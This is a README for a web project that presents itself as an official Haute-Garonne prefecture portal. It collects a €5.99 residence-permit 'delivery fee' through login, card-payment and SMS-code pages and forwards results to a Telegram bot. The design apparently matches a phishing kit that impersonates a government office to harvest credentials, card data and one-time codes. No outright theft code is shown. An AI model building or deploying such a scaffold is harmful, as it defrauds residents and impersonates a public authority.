# Haute-Garonne Prefecture Residence Permit Delivery System

## Project Overview

This project implements a web-based system for residents of Haute-Garonne to pay a €5.99 delivery fee for receiving their residence permit. The system includes user authentication, payment processing, SMS verification, and notification services.

## Features

- **User Authentication**: Secure login system with password protection
- **Payment Processing**: Card payment processing for the €5.99 delivery fee
- **SMS Verification**: Automated SMS code delivery upon successful payment
- **Email Notifications**: Send official letters via email with delivery confirmations
- **Telegram Integration**: Receive processing results and updates via Telegram bot

## Project Structure

```
haute-garonne-permit/
├── index.html          # Main landing page
├── login.html          # User authentication page
├── payment.html        # Payment processing page
├── otp.html            # SMS verification page
├── success.html        # Payment success confirmation page
├── style.css           # Styling for all pages
├── app.js              # Main application logic
├── payment.js          # Payment processing logic
├── otp.js              # SMS verification logic
├── telegram.js         # Telegram bot integration
├── emailService.js     # Email sending functionality
└── README.md           # This file
```

## Setup Instructions

### Prerequisites

- Node.js (v14.0.0 or higher)
- npm (v6.0.0 or higher)
- A valid email account for SMTP configuration
- Telegram Bot API token
- Payment gateway API credentials (Stripe, PayPal, or similar)

### Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd haute-garonne-permit
```

2. Install dependencies:
```bash
npm install
```

3. Configure environment variables:
Create a `.env` file in the project root with the following variables:

```env
PORT=3000
EMAIL_HOST=smtp.example.com
EMAIL_PORT=587
EMAIL_USER=your-email@example.com
EMAIL_PASSWORD=your-email-password
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_CHAT_ID=your-telegram-chat-id
PAYMENT_API_KEY=your-payment-gateway-api-key
```

### Configuration

#### Email Service (emailService.js)

Update the email configuration in `emailService.js`:

```javascript
const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransporter({
  host: process.env.EMAIL_HOST,
  port: process.env.EMAIL_PORT,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});
```

#### Telegram Integration (telegram.js)

Configure your Telegram bot token and chat ID in `telegram.js`:

```javascript
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
```

#### Payment Processing (payment.js)

Configure your payment gateway credentials in `payment.js`:

```javascript
const PAYMENT_API_KEY = process.env.PAYMENT_API_KEY;
const DELIVERY_FEE = 5.99; // €5.99 delivery fee
```

### Running the Application

Start the development server:

```bash
npm start
```

For production deployment:

```bash
npm run build
npm run serve
```

The application will be available at `http://localhost:3000`

## User Flow

1. **Login Page** (`login.html`)
   - Users enter their credentials
   - Authentication validated against database
   - Redirect to payment page on success

2. **Payment Page** (`payment.html`)
   - Display €5.99 delivery fee
   - Process card information
   - Charge user's payment method
   - Send SMS code to registered mobile number
   - Redirect to OTP verification

3. **OTP Verification** (`otp.html`)
   - User enters SMS-received code
   - Validate code against server-generated code
   - Redirect to success page on validation

4. **Success Page** (`success.html`)
   - Display payment confirmation
   - Show processing status
   - Provide contact information

## Email Letter Feature

The system can send official letters via email:

```javascript
sendEmail({
  to: userEmail,
  subject: 'Residence Permit Delivery Confirmation',
  text: `Dear ${userName}, your residence permit delivery payment of €5.99 has been processed successfully. Reference number: ${referenceId}`
});
```

## Telegram Notifications

Receive processing results via Telegram:

```javascript
sendTelegramMessage({
  chatId: TELEGRAM_CHAT_ID,
  text: `New residence permit delivery request: ${userName} - Payment: €5.99 - Status: Completed`
});
```

## Security Considerations

- Passwords are hashed using bcrypt
- Payment information is tokenized
- SMS codes expire after 5 minutes
- Session management with secure cookies
- HTTPS recommended for production

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/login` | POST | User authentication |
| `/pay` | POST | Process payment |
| `/verify` | POST | Verify SMS code |
| `/send-letter` | POST | Send email letter |
| `/notify` | POST | Send Telegram notification |

## Troubleshooting

### Common Issues

1. **Payment fails**: Verify payment gateway credentials
2. **SMS not received**: Check Twilio/SMS provider configuration
3. **Email not sent**: Verify SMTP settings and credentials
4. **Telegram messages not received**: Check bot token and chat ID

### Logs

Check the console output for error messages:

```bash
npm start
# Look for error messages in the terminal
```

## Support

For issues and feature requests, please contact the development team or open an issue in the repository.

## License

This project is proprietary software for Haute-Garonne Prefecture use only.

## Version History

- v1.0.0 - Initial release with login, payment, OTP, email, and Telegram features